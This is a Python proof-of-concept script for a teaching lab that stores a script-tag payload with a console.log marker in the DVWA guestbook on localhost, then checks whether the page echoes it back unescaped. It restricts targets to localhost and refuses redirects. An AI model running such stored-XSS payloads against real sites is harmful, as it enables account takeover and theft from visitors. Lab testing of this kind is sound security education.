#!/usr/bin/env python3
'''XSS-005 draft POC: stored XSS in DVWA guestbook (teaching lab only).

Phase write: POST btnSign/txtName/mtxMessage with a harmless console marker.
Phase read:  GET the same page and report whether the stored marker comes back
            raw (unescaped in HTML) or HTML-encoded.
Browser execution must be observed manually in the console; this script only
performs the HTTP write/read and never claims execution.
Safety: localhost only, redirects not followed, harmless marker, cookie read
from a local file and never printed.
'''
import argparse
import json
import urllib.parse
import urllib.request
from urllib.error import HTTPError, URLError

ALLOWED_HOSTS = ('localhost', '127.0.0.1', '::1')
MARKER = "console.log('LLM_LAB_XSS')"
PAYLOAD = '<script>' + MARKER + '</script>'


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def check_url(url):
    parts = urllib.parse.urlsplit(url)
    if parts.scheme not in ('http', 'https'):
        raise SystemExit('refused scheme: %s' % parts.scheme)
    if parts.hostname not in ALLOWED_HOSTS:
        raise SystemExit('refused host: %s' % parts.hostname)


def send(url, data, cookie, timeout):
    check_url(url)
    body = urllib.parse.urlencode(data).encode() if data is not None else None
    req = urllib.request.Request(url, data=body)
    req.add_header('User-Agent', 'llm-lab-poc/1.0')
    if cookie:
        req.add_header('Cookie', cookie)
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=timeout) as resp:
            return resp.status, resp.read().decode('utf-8', 'replace')
    except HTTPError as exc:
        return exc.code, exc.read().decode('utf-8', 'replace')
    except URLError as exc:
        raise SystemExit('connection error: %s' % exc.reason)


def main():
    ap = argparse.ArgumentParser(description='XSS-005 two-phase HTTP draft')
    ap.add_argument('--base', required=True, help='e.g. http://127.0.0.1/dvwa')
    ap.add_argument('--page', default='vulnerabilities/xss_s/')
    ap.add_argument('--cookie-file', required=True,
                    help='local file holding PHPSESSID=...;security=low (not printed)')
    ap.add_argument('--name', default='llmtest')
    ap.add_argument('--message', default=PAYLOAD)
    ap.add_argument('--phase', choices=('write', 'read', 'clear'), default='write')
    ap.add_argument('--timeout', type=float, default=15.0)
    ap.add_argument('--yes-truncate', action='store_true',
                    help='required for --phase clear: btnClear TRUNCATEs the whole guestbook')
    args = ap.parse_args()

    with open(args.cookie_file, 'r', encoding='utf-8') as fh:
        cookie = fh.read().strip()
    url = args.base.rstrip('/') + '/' + args.page.lstrip('/')

    if args.phase == 'clear':
        if not args.yes_truncate:
            raise SystemExit('refusing: clear sends btnClear = TRUNCATE guestbook (all rows)')
        status, text = send(url, {'btnClear': 'Clear Guestbook'}, cookie, args.timeout)
        print(json.dumps({'phase': 'clear', 'http_status': status}))
        return

    if args.phase == 'write':
        status, text = send(url, {'txtName': args.name, 'mtxMessage': args.message,
                                  'btnSign': 'Sign Guestbook'}, cookie, args.timeout)
    else:
        status, text = send(url, None, cookie, args.timeout)

    encoded = args.message.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;')
    print(json.dumps({'phase': args.phase, 'http_status': status,
                      'raw_marker_in_html': args.message in text,
                      'html_encoded_marker_in_html': encoded in text,
                      'response_bytes': len(text)}, ensure_ascii=False))
    print('NOTE: marker presence is not execution; open the page in a browser '
          'and check the console for LLM_LAB_XSS')


if __name__ == '__main__':
    main()
